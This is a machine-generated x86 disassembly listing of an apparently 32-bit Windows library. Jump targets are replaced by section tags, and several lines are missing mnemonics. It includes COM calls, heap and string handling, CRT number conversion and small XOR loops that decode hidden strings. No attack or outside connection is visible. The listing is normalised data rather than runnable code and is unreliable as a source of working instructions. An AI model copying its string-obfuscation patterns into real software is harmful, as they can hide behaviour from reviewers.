mov [ ecx ] eax
mov edx [ esi - 0x4 ]
sub esi 0x4
push edx
push edi
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
jne r-xdata
add ebx 0x4
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ esi ]
mov edi [ ebx ]
push eax
push edi
mov [ ebp - 0x4 ] ebx
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
pop edi
sub_100571fb
push 0x38
mov eax sub_1007e82c
call sub_10007703
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1004770a
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_1002a730
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10045daa
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_10019c00
retn 0x20
sub_100572c0
push ebp
mov ebp esp
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
mov ecx [ r--data ]
mov [ ebp - 0xbc ] 0x0
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x46
and edx 0xff
mov [ ebp + eax * 2 - 0x30 ] dx
inc eax
cmp eax 0x14
jb r-xdata
xor eax eax
lea edx [ ebp - 0xbc ]
push edx
mov [ ebp - 0x8 ] ax
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x30 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0xc0 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0xc0 ]
mov eax edx
lea esi [ eax + 0x2 ]
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
push edi
sar eax 0x1
push eax
push edx
lea ecx [ ebx + 0x78 ]
call sub_1005e3c0
mov ecx [ ebp - 0xc0 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebx + 0x88 ]
push r--data
xor edi edi
lea ecx [ ebx + 0x78 ]
call sub_1005e510
test eax eax
jne r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x93
call sub_1000a6f0
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0xbc ]
push edx
lea edx [ ebp - 0x88 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
lea eax [ edi + 0x2 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
lea edx [ ebp - 0xc0 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0xc0 ]
mov eax edx
lea esi [ eax + 0x2 ]
lea ebx [ ebx ]
pop edi
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ ebx + 0x94 ]
call sub_1005e3c0
mov ecx [ ebp - 0xc0 ]
mov edi [ SysFreeString@IAT ]
push ecx
call edi
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
lea edx [ ebp - 0xb8 ]
mov eax 0x52
call sub_1000a6f0
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0xbc ]
push edx
lea edx [ ebp - 0xb8 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
lea edx [ ebp - 0xc0 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0xc0 ]
lea esi [ ebx + 0xb0 ]
push esi
call sub_10049460
mov ecx [ ebp - 0xc0 ]
push ecx
call edi
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi + 0x10 ]
push r--data
xor edi edi
mov ecx esi
call sub_1005e510
test eax eax
jne r-xdata
pop edi
pop esi
mov eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x5c ]
mov eax 0x7f
call sub_1000a6f0
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0xbc ]
push edx
lea edx [ ebp - 0x5c ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
lea eax [ edi + 0x6 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xbc ]
mov ecx [ eax ]
lea edx [ ebp - 0xc0 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0xc0 ]
add ebx 0xcc
push ebx
call sub_10049460
mov ecx [ ebp - 0xc0 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov esi r--data
mov ecx ebx
call sub_10041130
mov ecx [ ebp - 0x4 ]
movzx eax al
neg eax
pop edi
sbb eax eax
pop esi
xor ecx ebp
and eax 0x8
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x7
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_100575c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f798
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi ]
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x58 ] 0x0
call sub_1000d1d0
mov [ ebp - 0x60 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x58 ]
push 0x4
push 0x0
mov [ ebp - 0x68 ] ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x4
call sub_1000a6f0
mov ecx [ ebp - 0x58 ]
test ecx ecx
je r-xdata
xor esi esi
mov [ eax ] 0x0
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x60 ]
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
jmp r-xdata
mov ecx [ ebp - 0x58 ]
mov eax [ edi + 0x4 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
inc [ esi ]
mov [ ebp - 0x64 ] esi
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x0
cmp edi edx
je r-xdata
mov esi [ ebp - 0x5c ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x58 ]
mov [ edi ] ecx
mov [ edi + 0x4 ] esi
inc [ esi ]
jmp r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ ebp - 0x4 ] 0xffffffff
dec [ esi ]
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_100576fd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push sub_1002bd98
call sub_10078583
add esp 0x10
pop esi
pop ebp
retn
sub_10057840
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_10057899
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_10057df0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080f98
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x34 ] eax
mov ebx ecx
mov [ ebp - 0x30 ] edi
cmp eax edi
je r-xdata
push edi
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
push r--data
mov ecx esi
mov [ esi ] ax
call sub_1005e3c0
cmp ebx edi
je r-xdata
push edi
push edi
push ebx
push eax
push edi
push edi
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x30 ] eax
cmp eax edi
je r-xdata
push r--data
mov ecx esi
call sub_1004a800
jmp r-xdata
lea eax [ eax + eax + 0x2 ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x34 ]
push ecx
mov edi eax
push edi
push ebx
push edx
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push ebx
xor eax eax
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] ax
call sub_1005e3c0
xor ebx ebx
push edi
push ebx
mov [ ebp - 0x4 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
lea edx [ ebp - 0x2c ]
mov [ esi ] cx
push edx
mov ecx esi
call sub_10051390
lea ecx [ ebp - 0x2c ]
call sub_10035d10
jmp r-xdata
push edi
push eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10057f30
push ebp
mov ebp esp
push 0xffffffff
push sub_10080c39
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x10 ] eax
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
mov [ esi ] cx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ edx + 0x10 ]
add eax [ ebx + 0x10 ]
mov edi [ esi + 0x10 ]
mov [ ebp - 0x10 ] 0x1
cmp edi eax
ja r-xdata
mov edx [ ebp + 0xc ]
push 0xffffffff
push 0x0
push edx
mov ecx esi
call sub_1000c1e0
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_1000c1e0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_10050a00
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_10057fe0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007e0c3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
push esi
mov [ ebp - 0x4 ] 0x1
call sub_10004b00
mov eax [ esi + 0x18 ]
add esp 0x4
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x18 ] 0x0
mov [ esi ] r--data
je r-xdata
push eax
call sub_10020a90
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_1005805f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax edi
jae r-xdata
mov ebx [ ebp + 0xc ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
push r--data
call sub_1003b4a6
test ebx ebx
je r-xdata
push r--data
call sub_100616c6
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_10050a00
test al al
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
sub edx edi
add edx edx
push edx
lea ecx [ ecx + edi * 2 ]
push ecx
lea ecx [ edi + ebx ]
lea eax [ eax + ecx * 2 ]
push eax
call sub_10077d10
add esp 0xc
push [ ebp + 0x10 ]
mov ecx esi
push ebx
push edi
call sub_1004bdc0
cmp [ esi + 0x14 ] 0x8
mov eax [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
jb r-xdata
xor edx edx
mov [ ecx + eax * 2 ] dx
sub_10058110
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov edi [ esi + 0x24 ]
mov edx [ edi ]
test edx edx
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
push ebx
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x3c ]
cmp edx ecx
jae r-xdata
test [ esi + 0x40 ] 0x2
jne r-xdata
mov ecx [ esi + 0x34 ]
mov ebx [ ecx ]
mov edx edi
add ebx edx
cmp edx ebx
jae r-xdata
mov eax [ esi + 0x34 ]
mov eax [ eax ]
add eax edx
mov [ edi ] ecx
sub eax ecx
mov ecx [ esi + 0x34 ]
mov [ ecx ] eax
pop ebx
pop edi
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn 0x4
test edi edi
jne r-xdata
dec [ ecx ]
jmp r-xdata
mov eax [ esi + 0x34 ]
mov ecx [ esi + 0x10 ]
mov ebx [ eax ]
sub ebx [ ecx ]
add ebx edi
xor ebx ebx
jmp r-xdata
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
pop ebx
lea edx [ ecx + 0x1 ]
mov [ esi ] edx
pop edi
mov [ ecx ] al
pop esi
mov esp ebp
pop ebp
retn 0x4
test eax eax
je r-xdata
mov eax 0x20
jmp r-xdata
mov eax ebx
shr eax 0x1
cmp eax 0x20
jae r-xdata
mov edi edi
mov edx 0x7fffffff
sub edx eax
cmp edx ebx
jae r-xdata
test eax eax
jne r-xdata
shr eax 0x1
jne r-xdata
add eax ebx
push eax
lea ecx [ esi + 0x44 ]
mov [ ebp - 0x4 ] eax
call sub_10045700
mov edi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x8 ] edx
test ebx ebx
